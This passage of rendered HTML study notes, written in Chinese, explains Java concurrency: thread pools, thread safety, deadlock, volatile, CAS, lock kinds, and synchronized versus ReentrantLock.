class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(futureTask);</span><br><span class="line">    t.start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">result</span> <span class="operator">=</span> futureTask.get();  <span class="comment">// 获取线程执行结果</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Result: &quot;</span> + result);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException | ExecutionException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-3-4-使用线程池（Executor框架）">2.3.4 使用线程池（Executor框架）</h3>
<p>从Java 5开始引入的java.util.concurrent.ExecutorService和相关类提供了线程池的支持，这是一种更高效的线程管理方式，避免了频繁创建和销毁线程的开销。可以通过Executors类的静态方法创建不同类型的线程池。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 线程执行的代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">ExecutorService</span> <span class="variable">executor</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">10</span>);  <span class="comment">// 创建固定大小的线程池</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        executor.submit(<span class="keyword">new</span> <span class="title class_">Task</span>());  <span class="comment">// 提交任务到线程池执行</span></span><br><span class="line">    &#125;</span><br><span class="line">    executor.shutdown();  <span class="comment">// 关闭线程池</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>[!note] 可以直接调用 Thread 类的 run 方法吗？直接调用run方法，只会执行通过一个线程中的任务，而不会启动新线程。应该调用Thread.start方法，这个方法将创建一个执行run方法的新线程。<br>
new 一个 <code>Thread</code>，线程进入了新建状态。调用 <code>start()</code>方法，会启动一个线程并使线程进入了就绪状态，当分配到时间片后就可以开始运行了。 <code>start()</code> 会执行线程的相应准备工作，然后自动执行 <code>run()</code> 方法的内容，这是真正的多线程工作。 但是，直接执行 <code>run()</code> 方法，会把 <code>run()</code> 方法当成一个 main 线程下的普通方法去执行，并不会在某个线程中执行它，所以这并不是多线程工作。</p>
</blockquote>
<blockquote>
<p>[! question] Thread#sleep() 方法和 Object#wait() 方法对比</p>
<ul class="lvl-1">
<li class="lvl-2"><strong><code>sleep()</code> 方法没有释放锁，而 <code>wait()</code> 方法释放了锁</strong> 。</li>
<li class="lvl-2"><code>wait()</code> 通常被用于线程间交互/通信，<code>sleep()</code>通常被用于暂停执行。</li>
<li class="lvl-2"><code>wait()</code> 方法被调用后，线程不会自动苏醒，需要别的线程调用同一个对象上的 <code>notify()</code>或者 <code>notifyAll()</code> 方法。<code>sleep()</code>方法执行完成后，线程会自动苏醒，或者也可以使用 <code>wait(long timeout)</code> 超时后线程会自动苏醒。</li>
<li class="lvl-2"><code>sleep()</code> 是 <code>Thread</code> 类的静态本地方法，<code>wait()</code> 则是 <code>Object</code> 类的本地方法。为什么这样设计呢？下一个问题就会聊到</li>
</ul>
</blockquote>
<h1>3 多线程</h1>
<h2 id="3-1-并发、并行">3.1 并发、并行</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>并发</strong>：两个及两个以上的作业在同一 <strong>时间段</strong> 内执行。</p>
</li>
<li class="lvl-2">
<p><strong>并行</strong>：两个及两个以上的作业在同一 <strong>时刻</strong> 执行。</p>
</li>
</ul>
<h2 id="3-2-同步、异步">3.2 同步、异步</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>同步</strong>：发出一个调用之后，在没有得到结果之前， 该调用就不可以返回，一直等待。</p>
</li>
<li class="lvl-2">
<p><strong>异步</strong>：调用在发出之后，不用等待返回结果，该调用直接返回。</p>
</li>
<li class="lvl-2">
<p>线程同步：多个线程合作，线程的执行需要满足某种时序关系</p>
</li>
</ul>
<h2 id="3-3-线程安全和不安全">3.3 线程安全和不安全</h2>
<p>线程安全和不安全是在多线程环境下对于同一份数据的访问是否能够保证其<strong>正确性和一致性</strong>的描述。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>线程安全指的是在多线程环境下，对于同一份数据，不管有多少个线程同时访问，都能保证这份数据的正确性和一致性。</p>
</li>
<li class="lvl-2">
<p>线程不安全则表示在多线程环境下，对于同一份数据，多个线程同时访问时可能会导致数据混乱、错误或者丢失。</p>
</li>
</ul>
<ol>
<li class="lvl-3">
<p><strong>线程安全</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">线程安全指的是在多线程环境下，对共享数据的访问操作能够保证在并发情况下不会导致数据的不一致性或损坏。一个线程安全的操作或数据结构能够在并发访问时维持其内部状态的一致性。</li>
<li class="lvl-6">线程安全的实现通常会采用同步机制（例如锁、信号量等）来保护共享资源的访问，以确保在任意时刻只有一个线程能够访问共享资源，从而避免竞态条件（Race Condition）和其他并发问题。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>线程不安全</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">线程不安全指的是在多线程环境下，对共享数据的访问操作可能会导致数据的不一致性或损坏。线程不安全的操作或数据结构在并发访问时无法保证其内部状态的一致性，可能会导致意外的结果或程序错误。</li>
<li class="lvl-6">线程不安全的实现通常没有考虑到并发访问的情况，没有采取适当的同步措施来保护共享资源的访问，因此可能会出现竞态条件和其他并发问题。</li>
</ul>
</li>
</ol>
<p>举例来说，如果多个线程同时尝试向同一个数组中添加元素，而该数组的添加操作没有进行适当的同步控制，那么就可能导致线程不安全的情况，如数据覆盖、越界访问等。为了保证线程安全，需要在并发访问共享资源时使用适当的同步机制来确保数据的一致性。</p>
<h2 id="3-4-线程安全">3.4 线程安全</h2>
<p>保证线程安全，避免数据竞争造成数据混乱的问题</p>
<p>Java的线程安全体现在三个方面：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>原子性</strong>：提供互斥访问，同一时刻只能有一个线程对数据进行操作，在Java中使用了atomic和synchronized这两个关键字来确保原子性；</p>
</li>
<li class="lvl-2">
<p><strong>可见性</strong>：一个线程对主内存的修改可以及时地被其他线程看到，在Java中使用了synchronized和volatile这两个关键字确保可见性；</p>
</li>
<li class="lvl-2">
<p><strong>有序性</strong>：一个线程观察其他线程中的指令执行顺序，由于指令重排序，该观察结果一般杂乱无序，在Java中使用了happens-before原则来确保有序性。</p>
</li>
</ul>
<h2 id="3-5-保证数据一致性方案">3.5 保证数据一致性方案</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>事务管理</strong>：使用数据库事务来确保一组数据库操作要么全部成功提交，要么全部失败回滚。通过ACID（原子性、一致性、隔离性、持久性）属性，数据库事务可以保证数据的一致性。</p>
</li>
<li class="lvl-2">
<p><strong>锁机制</strong>：使用锁来实现对共享资源的互斥访问。在 Java 中，可以使用 synchronized 关键字、ReentrantLock 或其他锁机制来控制并发访问，从而避免并发操作导致数据不一致。</p>
</li>
<li class="lvl-2">
<p><strong>版本控制</strong>：通过乐观锁的方式，在更新数据时记录数据的版本信息，从而避免同时对同一数据进行修改，进而保证数据的一致性。</p>
</li>
</ul>
<h2 id="3-6-线程死锁">3.6 线程死锁</h2>
<p>线程死锁描述的是这样一种情况：多个线程同时被阻塞，它们中的一个或者全部都在等待某个资源被释放。由于线程被无限期地阻塞，因此程序不可能正常终止。</p>
<blockquote>
<p>[!question] 检测死锁使用<code>jmap</code>、<code>jstack</code>等命令查看 JVM 线程栈和堆内存的情况。如果有死锁，<code>jstack</code> 的输出中通常会有 <code>Found one Java-level deadlock:</code>的字样，后面会跟着死锁相关的线程信息。另外，实际项目中还可以搭配使用<code>top</code>、<code>df</code>、<code>free</code>等命令查看操作系统的基本情况，出现死锁可能会导致 CPU、内存等资源消耗过高。</p>
</blockquote>
<blockquote>
<p>[! question] 如何预防和避免死锁？</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>死锁预防</p>
<ul class="lvl-2">
<li class="lvl-7"><strong>破坏请求与保持条件</strong>：一次性申请所有的资源。</li>
<li class="lvl-6"><strong>破坏不剥夺条件</strong>：占用部分资源的线程进一步申请其他资源时，如果申请不到，可以主动释放它占有的资源。</li>
<li class="lvl-6"><strong>破坏循环等待条件</strong>：靠按序申请资源来预防。按某一顺序申请资源，释放资源则反序释放。破坏循环等待条件。</li>
</ul>
</li>
<li class="lvl-2">
<p>死锁避免：在资源分配时，借助于算法（比如银行家算法）对资源分配进行计算评估，使其进入安全状态。</p>
</li>
<li class="lvl-2">
<p>死锁检测</p>
</li>
</ul>
<h1>4 线程同步</h1>
<p>原子性：一次操作或者多次操作，要么所有的操作全部都得到执行并且不会受到任何因素的干扰而中断，要么都不执行。可见性：当一个线程对共享变量进行了修改，那么另外的线程都是立即可以看到修改后的最新值。有序性：由于指令重排序问题，代码的执行顺序未必就是编写代码时候的顺序。</p>
<h2 id="4-1-volatile-可见性、有序性">4.1 volatile(可见性、有序性)</h2>
<p>volatile关键字用于变量，确保所有线程看到的是该变量的最新值，而不是可能存储在本地寄存器中的副本。<br>
<code>可见性、不保证原子性、防止JVM的指令重排序</code><br>
<code>适用于一写多读</code></p>
<blockquote>
<p>volatile 关键字为实例域的同步访问提供了一种免锁机制。如果声明一个域为volatile ,那么编译器和虚拟机就知道该域是可能被另一个线程并发更新的。保证变量的可见性。当一个变量被声明成volatile，JMM会确保所有线程看到这个变量的值是一致的。</p>
</blockquote>
<p>volatile禁用CPU缓存，表示这个变量是共享且不稳定的，每次使用它都到主存中进行读取。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> inc=<span class="number">0</span>;</span><br><span class="line">inc++;  <span class="comment">//volatile不能保证该操作的原子性</span></span><br><span class="line"><span class="number">1.</span> 读取 inc 的值。</span><br><span class="line"><span class="number">2.</span> 对 inc 加 <span class="number">1</span>。</span><br><span class="line"><span class="number">3.</span> 将 inc 的值写回内存。</span><br></pre></td></tr></table></figure>
<h3 id="4-1-1-可见性">4.1.1 可见性</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>保证变量对所有线程的可见性</strong>。当一个变量被声明为volatile时，它会保证对这个变量的写操作会立即刷新到主存中，而对这个变量的读操作会直接从主存中读取，从而确保了多线程环境下对该变量访问的可见性。这意味着一个线程修改了volatile变量的值，其他线程能够立刻看到这个修改，不会受到各自线程工作内存的影响。</p>
<ul class="lvl-2">
<li class="lvl-6">1️⃣在生成最低成汇编指令时，<mark>对volatile修饰的共享变量写操作增加Lock前缀指令，Lock 前缀的指令会引起 CPU 缓存写回内存</mark>；</li>
<li class="lvl-6">2️⃣CPU 的缓存回写到内存会导致其他 CPU 缓存了该内存地址的数据无效；</li>
<li class="lvl-6">3️⃣volatile 变量通过缓存一致性协议保证每个线程获得最新值；</li>
<li class="lvl-6">4️⃣缓存一致性协议保证每个 CPU 通过嗅探在总线上传播的数据来检查自己缓存的值是不是修改；</li>
<li class="lvl-6">5️⃣当 CPU 发现自己缓存行对应的内存地址被修改，会将当前 CPU 的缓存行设置成无效状态，重新从内存中把数据读到 CPU 缓存。</li>
</ul>
</li>
</ul>
<p>1. <strong>缓存一致性协议</strong>：<br>
• 在多核处理器系统中，每个处理器核都有自己的缓存。当一个线程修改了一个<code>volatile</code>变量，这个修改会立即被写回到主内存，并且通过缓存一致性协议（如MESI协议）使其他处理器核中的缓存无效（或者更新）。<br>
• 当其他线程读取这个<code>volatile</code>变量时，它们会从主内存中读取最新的值，而不是从缓存中读取过时的值。</p>
<p>2. <strong>编译器优化禁止</strong>：<br>
-  编译器不会对<code>volatile</code>变量进行某些优化，比如将变量值存储在寄存器中，而不是从内存中读取。这确保了每次访问<code>volatile</code>变量都会直接从内存中读取。</p>
<h3 id="4-1-2-有序性">4.1.2 有序性</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>禁止指令重排序优化</strong>。volatile关键字在Java中主要通过内存屏障来禁止特定类型的指令重排序。</p>
<ul class="lvl-2">
<li class="lvl-6">
<p>1）<strong>写-写（Write-Write）屏障</strong>：在对volatile变量执行写操作之前，会插入一个写屏障。这确保了在该变量写操作之前的所有普通写操作都已完成，防止了这些写操作被移到volatile写操作之后。</p>
</li>
<li class="lvl-6">
<p>2）<strong>读-写（Read-Write）屏障</strong>：在对volatile变量执行读操作之后，会插入一个读屏障。它确保了对volatile变量的读操作之后的所有普通读操作都不会被提前到volatile读之前执行，保证了读取到的数据是最新的。</p>
</li>
<li class="lvl-6">
<p>3）<strong>写-读（Write-Read）屏障</strong>：这是最重要的一个屏障，它发生在volatile写之后和volatile读之前。这个屏障确保了volatile写操作之前的所有内存操作（包括写操作）都不会被重排序到volatile读之后，同时也确保了volatile读操作之后的所有内存操作（包括读操作）都不会被重排序到volatile写之前。</p>
</li>
</ul>
</li>
</ul>
<p>1. <strong>插入内存屏障</strong>：<br>
• 当JVM编译含有<code>volatile</code>变量的代码时，会在读写<code>volatile</code>变量前后插入内存屏障（Memory Barrier/Fence）。<br>
• 这些内存屏障会防止JVM和处理器对这些操作进行重排序，确保在<code>volatile</code>变量读写操作之前的所有操作都已经完成，并且之后的操作不会提前进行。<br>
2. ** happens-before 原则**：<br>
• Java内存模型定义了<code>happens-before</code>原则，其中有一条规则是：对一个<code>volatile</code>变量的写操作对后续对这个变量的读操作是可见的。<br>
• 这意味着，如果你有一个线程写入了<code>volatile</code>变量，然后另一个线程读取了这个变量，那么读取操作保证能看到写入操作的结果，且读取操作之前的所有写操作也都对读取线程可见。</p>
<p><a href="https://blog.csdn.net/itakyubi/article/details/100527743#:~:text=volatile">volatile可见性实现原理_volatile是怎么实现可见性的?-CSDN博客</a><br>
[# volatile关键字，他是如何保证可见性，有序性？](<a href="https://mp.weixin.qq.com/s/dcQMDw8aWx_KcFRw5ZLPnQ">volatile关键字，他是如何保证可见性，有序性？ (qq.com)</a>)</p>
<h2 id="4-2-锁">4.2 锁</h2>
<h3 id="4-2-1-乐观锁和悲观锁">4.2.1 乐观锁和悲观锁</h3>
<p><code>乐观锁</code>：线程可以不停地执行，无需加锁也无需等待，只是在<mark>提交修改的时候去验证对应的资源（也就是数据）是否被其它线程修改了</mark>。乐观锁（Optimistic Locking）通常不锁定资源，而是在更新数据时检查数据是否已被其他线程修改。<code>悲观锁</code>：<mark>每次获取资源都会上锁</mark>，只有持有者释放锁其他线程才可以访问共享资源。Java 中<code>synchronized</code>和<code>ReentrantLock</code>等独占锁就是悲观锁思想的实现。<strong>乐观锁主要针对的对象是单个共享变量</strong>。悲观锁（Pessimistic Locking）通常指在访问数据前就锁定资源，假设最坏的情况，即数据很可能被其他线程修改。</p>
<p><code>对比</code>：高并发的场景下，乐观锁相比悲观锁来说，不存在锁竞争造成线程阻塞，也不会有死锁的问题，在性能上往往会更胜一筹。但是，如果冲突频繁发生（写占比非常多的情况），会频繁失败和重试，这样同样会非常影响性能，导致 CPU 飙升。</p>
<ul class="lvl-0">
<li class="lvl-3">
<p>悲观锁通常多用于写比较多的情况（多写场景，竞争激烈），这样可以避免频繁失败和重试影响性能</p>
</li>
<li class="lvl-2">
<p>乐观锁通常多用于写比较少的情况（多读场景，竞争较少），这样可以避免频繁加锁影响性能。</p>
</li>
</ul>
<h3 id="4-2-2-乐观锁实现">4.2.2 乐观锁实现</h3>
<h4 id="版本号机制">版本号机制</h4>
<p>一般是在数据表中加上一个数据版本号 <code>version</code> 字段，表示数据被修改的次数。当数据被修改时，<code>version</code> 值会加一。当线程 A 要更新数据值时，在读取数据的同时也会读取 <code>version</code> 值，<strong>在提交更新时，若刚才读取到的 version 值为当前数据库中的 <code>version</code> 值相等时才更新</strong>，否则重试更新操作，直到更新成功。</p>
<h4 id="CAS-Compare-And-Swap">CAS(Compare And Swap)</h4>
<blockquote>
<p>专用机器指令,CAS 是一个原子操作，底层依赖于一条 CPU 的原子指令。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403051047897.png" alt="image.png"></p>
<p>CAS 涉及到三个操作数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>V</strong>：要更新的变量值(Var)</p>
</li>
<li class="lvl-2">
<p><strong>E</strong>：预期值(Expected)</p>
</li>
<li class="lvl-2">
<p><strong>N</strong>：拟写入的新值(New)</p>
</li>
</ul>
<p>当且仅当 V 的值等于 E 时，CAS 通过原子方式用新值 N 来更新 V 的值。如果不等，说明已经有其它线程更新了 V，则当前线程放弃更新。</p>
<p><code>sun.misc</code>包下的<code>Unsafe</code>类提供了<code>compareAndSwapObject</code>、<code>compareAndSwapInt</code>、<code>compareAndSwapLong</code>方法来实现的对<code>Object</code>、<code>int</code>、<code>long</code>类型的 CAS 操作</p>
<h4 id="CAS存在问题">CAS存在问题</h4>
<h5 id="ABA">ABA</h5>
<p>如果一个变量 V 初次读取的时候是 A 值，并且在准备赋值的时候检查到它仍然是 A 值，但是在这期间可能被修改为B值。解决：在变量前追加版本号和时间戳</p>
<h5 id="循环时间长开销大">循环时间长开销大</h5>
<p>CAS 经常会用到<code>自旋操作</code>来进行重试，也就是不成功就一直循环执行直到成功。如果长时间不成功，会给 CPU 带来非常大的执行开销。</p>
<h5 id="只能保证一个共享变量的原子操作">只能保证一个共享变量的原子操作</h5>
<p>CAS 只对单个共享变量有效，当操作涉及跨多个共享变量时 CAS 无效。但是从 JDK 1.5 开始，提供了<code>AtomicReference</code>类来保证引用对象之间的原子性，你可以把多个变量放在一个对象里来进行 CAS 操作.所以我们可以使用锁或者利用<code>AtomicReference</code>类把多个共享变量合并成一个共享变量来操作。</p>
<h3 id="4-2-3-公平锁、非公平锁">4.2.3 公平锁、非公平锁</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>公平锁</strong> : 锁被释放之后，先申请的线程先得到锁。性能较差一些，因为公平锁为了保证时间上的绝对顺序，上下文切换更频繁。</p>
</li>
<li class="lvl-2">
<p><strong>非公平锁</strong>：锁被释放之后，后申请的线程可能会先获取到锁，是随机或者按照其他优先级排序的。性能更好，但可能会导致某些线程永远无法获取到锁。</p>
</li>
</ul>
<h3 id="4-2-4-可中断锁、不可中断锁">4.2.4 可中断锁、不可中断锁</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>可中断锁</strong>：获取锁的过程中可以被中断，不需要一直等到获取锁之后 才能进行其他逻辑处理。<code>ReentrantLock</code> 就属于是可中断锁。</p>
</li>
<li class="lvl-2">
<p><strong>不可中断锁</strong>：一旦线程申请了锁，就只能等到拿到锁以后才能进行其他的逻辑处理。 <code>synchronized</code> 就属于是不可中断锁。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th></th>
<th>可见性</th>
<th>原子性</th>
<th>可重入</th>
<th>公平锁、非公平锁</th>
<th>可中断锁、不可中断</th>
</tr>
</thead>
<tbody>
<tr>
<td>volatile</td>
<td>是</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>synchronized</td>
<td>是</td>
<td>是</td>
<td>是</td>
<td>非公平锁</td>
<td></td>
</tr>
<tr>
<td>ReentrantLock</td>
<td></td>
<td></td>
<td>是</td>
<td>公平锁、非公平锁</td>
<td>可中断锁</td>
</tr>
</tbody>
</table>
<h3 id="4-2-5-共享锁、独占锁">4.2.5 共享锁、独占锁</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>共享锁</strong>：一把锁可以被多个线程同时获得。</p>
</li>
<li class="lvl-2">
<p><strong>独占锁</strong>：一把锁只能被一个线程获得。</p>
</li>
</ul>
<h3 id="4-2-6-synchronized（互斥性、可见性、有序性）">4.2.6 synchronized（互斥性、可见性、有序性）</h3>
<p>对象锁是通过<code>synchronized</code>关键字锁定对象的监视器（monitor）来实现的。</p>
<p><code>保证数据可见性、保证数据原子性</code></p>
<blockquote>
<p>每一个对象有一个内部锁，并且该锁有一个内部条件。由锁来管理那些试图进入synchronized 方法的线程， 由条件来管理那些调用wait 的线程。主要解决的是多个线程之间访问资源的同步性，可以保证被它修饰的方法或者代码块在任意时刻只能有一个线程执行。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">notifyAll</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">notify</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">wait</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>修饰实例方法（获取对象实例锁）</p>
</li>
<li class="lvl-3">
<p>修饰静态方法（获取类的锁）</p>
</li>
<li class="lvl-3">
<p>修饰代码块（锁指定对象/类）</p>
<ol>
<li class="lvl-7"><code>synchronized(object)</code> 表示进入同步代码库前要获得 <strong>给定对象的锁</strong>。</li>
<li class="lvl-7"><code>synchronized(类.class)</code> 表示进入同步代码前要获得 <strong>给定 Class 的锁</strong></li>
</ol>
</li>
</ol>
<p><strong>构造方法不能使用 synchronized 关键字修饰。</strong><br>
构造方法本身就属于线程安全的，不存在同步的构造方法一说。</p>
<blockquote>
<p>[!note] 静态 <code>synchronized</code> 方法和非静态 <code>synchronized</code> 方法之间的调用互斥么？</p>
</blockquote>
<p>不互斥！如果一个线程 A 调用一个实例对象的非静态 <code>synchronized</code> 方法，而线程 B 需要调用这个实例对象所属类的静态 <code>synchronized</code> 方法，是允许的，不会发生互斥现象，因为访问静态 <code>synchronized</code> 方法占用的锁是当前类的锁，而访问非静态 <code>synchronized</code> 方法占用的锁是当前实例对象锁。</p>
<p><a href="https://blog.csdn.net/weixin_44772566/article/details/137398521">一文彻底搞懂synchronized实现原理-CSDN博客</a></p>
<h4 id="synchronized底层原理">synchronized底层原理</h4>
<blockquote>
<p>Java中的每一个对象有一个内部的锁和内部的条件。如果一个方法用synchronized关键字声明，那么，它表现的就像是一个监视器方法。通过调用wait/notifyAll/notify来访问条件变量</p>
</blockquote>
<p>synchronized同步语句块</p>
<p><code>synchronized</code> 同步语句块的实现使用的是 <code>monitorenter</code> 和 <code>monitorexit</code> 指令，其中 <code>monitorenter</code> 指令指向同步代码块的开始位置，<code>monitorexit</code> 指令则指明同步代码块的结束位置。当执行 <code>monitorenter</code> 指令时，线程试图获取锁也就是获取 <strong>对象监视器 <code>monitor</code></strong> 的持有权。</p>
<p>在执行<code>monitorenter</code>时，会尝试获取对象的锁，如果锁的计数器为 0 则表示锁可以被获取，获取后将锁计数器设为 1 也就是加 1。</p>
<p>实例方法、静态方法如果是实例方法，JVM 会尝试获取实例对象的锁。如果是静态方法，JVM 会尝试获取当前 class 的锁。</p>
<p>synchronized是Java提供的原子性内置锁，这种内置的并且使用者看不到的锁也被称为监视器锁，  使用synchronized之后，会在编译之后在同步的代码块前后加上monitorenter和monitorexit字节码指令，他依赖操作系统底层互斥锁实现。他的作用主要就是实现原子性操作和解决共享变量的内存可见性问题。</p>
<h4 id="JDK1-6-之后的-synchronized-底层做了哪些优化？锁升级原理了解吗？">JDK1.6 之后的 synchronized 底层做了哪些优化？锁升级原理了解吗？</h4>
<p>在jdk1.5（包含）版本之前，因为加锁和释放锁的过程JVM的底层都是由操作系统mutex lock来实现的，其中会涉及上下文的切换（即用户态和内核态的转换），性能消耗极其高，所以在当时synchronized锁是公认的重量级锁。</p>
<p>在 Java 6 之后， <code>synchronized</code> 引入了大量的优化如自旋锁、适应性自旋锁、锁消除、锁粗化、偏向锁、轻量级锁等技术来减少锁操作的开销，这些优化让 <code>synchronized</code> 锁的效率提升了很多（JDK18 中，偏向锁已经被彻底废弃，前面已经提到过了）。</p>
<p>锁主要存在四种状态，依次是：无锁状态、偏向锁状态、轻量级锁状态、重量级锁状态，他们会随着竞争的激烈而逐渐升级。注意锁可以升级不可降级，这种策略是为了提高获得锁和释放锁的效率。</p>
<p><a href="https://www.cnblogs.com/star95/p/17542850.html">浅析synchronized锁升级的原理与实现 - 小新成长之路 - 博客园 (cnblogs.com)</a></p>
<blockquote>
<p>[!question] synchronized锁升级过程</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s/SRAPGkiu44v62YSd1EAoJQ">sychronized的自旋锁、偏向锁、轻量级锁、重量级锁，分别介绍和联系 (qq.com)</a></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>偏向锁：这个是在偏向锁开启之后的锁的状态，如果还没有一个线程拿到这个锁的话，这个状态叫做匿名偏向，当一个线程拿到偏向锁的时候，下次想要竞争锁只需要拿线程ID跟MarkWord当中存储的线程ID进行比较，如果线程ID相同则直接获取锁（相当于锁偏向于这个线程），不需要进行CAS操作和将线程挂起的操作。</p>
</li>
<li class="lvl-2">
<p>轻量级锁：在这个状态下线程主要是通过CAS操作实现的。将对象的MarkWord存储到线程的虚拟机栈上，然后通过CAS将对象的MarkWord的内容设置为指向Displaced Mark Word的指针，如果设置成功则获取锁。在线程出临界区的时候，也需要使用CAS，如果使用CAS替换成功则同步成功，如果失败表示有其他线程在获取锁，那么就需要在释放锁之后将被挂起的线程唤醒。</p>
</li>
<li class="lvl-2">
<p>重量级锁：当有两个以上的线程获取锁的时候轻量级锁就会升级为重量级锁，因为CAS如果没有成功的话始终都在自旋，进行while循环操作，这是非常消耗CPU的，但是在升级为重量级锁之后，线程会被操作系统调度然后挂起，这可以节约CPU资源。（用户态到内核态切换）<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202409181007492.png" alt="image.png"></p>
</li>
</ul>
<h4 id="synchronized-和-volatile">synchronized 和 volatile</h4>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>volatile</code> 关键字是线程同步的轻量级实现，所以 <code>volatile</code>性能肯定比<code>synchronized</code>关键字要好 。但是 <code>volatile</code> 关键字只能用于变量而 <code>synchronized</code> 关键字可以修饰方法以及代码块 。（原子性）</p>
</li>
<li class="lvl-2">
<p><code>volatile</code> 关键字能保证数据的<strong>可见性</strong>，但不能保证数据的原子性。<code>synchronized</code> 关键字两者都能保证，<strong>原子性和可见性</strong>。</p>
</li>
<li class="lvl-2">
<p><code>volatile</code>关键字主要用于解决变量在多个线程之间的可见性，而 <code>synchronized</code> 关键字解决的是多个线程之间访问资源的同步性。</p>
</li>
</ul>
<p>syncronized加锁时有无锁、偏向锁、轻量级锁和重量级锁几个级别。偏向锁用于当一个线程进入同步块时，如果没有任何其他线程竞争，就会使用偏向锁，以减少锁的开销。轻量级锁使用线程栈上的数据结构，避免了操作系统级别的锁。重量级锁则涉及操作系统级的互斥锁。</p>
<h3 id="4-2-7-ReentrantLock-可重入锁">4.2.7 ReentrantLock(可重入锁)</h3>
<blockquote>
<p>可重入、独占式锁、可中断锁</p>
</blockquote>
<p><code>ReentrantLock</code> 实现了 <code>Lock</code> 接口，是一个可重入且独占式的锁，和 <code>synchronized</code> 关键字类似。不过，<code>ReentrantLock</code> 更灵活、更强大，增加了轮询、超时、中断、公平锁和非公平锁等高级功能。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">ReentrantLock</span><span class="params">( )</span></span> 构建一个可以被用来保护临界区的可重入锁。</span><br><span class="line"><span class="function"><span class="title">ReentrantLock</span><span class="params">(boo1ean fair )</span></span> 构建一个带有公平策略的锁。一个公平锁偏爱等待时间最长的线程。但是，这一公平的保证将大大降低性能。所以，默认情况下，锁没有被强制为公平的。</span><br></pre></td></tr></table></figure>
<h4 id="synchronized-和-ReentrantLock">synchronized 和 ReentrantLock</h4>
<blockquote>
<p><strong>两者都是可重入锁</strong></p>
</blockquote>
<p>可重入锁也叫递归锁，指的是线程可以再次获取自己的内部锁。比如一个线程获得了某个对象的锁，此时这个对象锁还没有释放，当其再次想要获取这个对象的锁的时候还是可以获取的，如果是不可重入锁的话，就会造成死锁。</p>
<blockquote>
<p>synchronized 依赖于 JVM 而 ReentrantLock 依赖于 API</p>
</blockquote>
<p><code>synchronized</code> 是依赖于 JVM 实现的，前面我们也讲到了 虚拟机团队在 JDK1.6 为 <code>synchronized</code> 关键字进行了很多优化，但是这些优化都是在虚拟机层面实现的，并没有直接暴露给我们。</p>
<p><code>ReentrantLock</code> 是 JDK 层面实现的（也就是 API 层面，需要 lock() 和 unlock() 方法配合 try/finally 语句块来完成），所以我们可以通过查看它的源代码，来看它是如何实现的。</p>
<blockquote>
<p>ReentrantLock增加一些高级功能</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>等待可中断</strong> : <code>ReentrantLock</code>提供了一种能够中断等待锁的线程的机制，通过 <code>lock.lockInterruptibly()</code> 来实现这个机制。也就是说正在等待的线程可以选择放弃等待，改为处理其他事情。</p>
</li>
<li class="lvl-2">
<p><strong>可实现公平锁</strong> : <strong>ReentrantLock可以指定是公平锁还是非公平锁。而synchronized只能是非公平锁</strong>。所谓的公平锁就是先等待的线程先获得锁。<code>ReentrantLock</code>默认情况是非公平的，可以通过 <code>ReentrantLock</code>类的<code>ReentrantLock(boolean fair)</code>构造方法来指定是否是公平的。</p>
</li>
<li class="lvl-2">
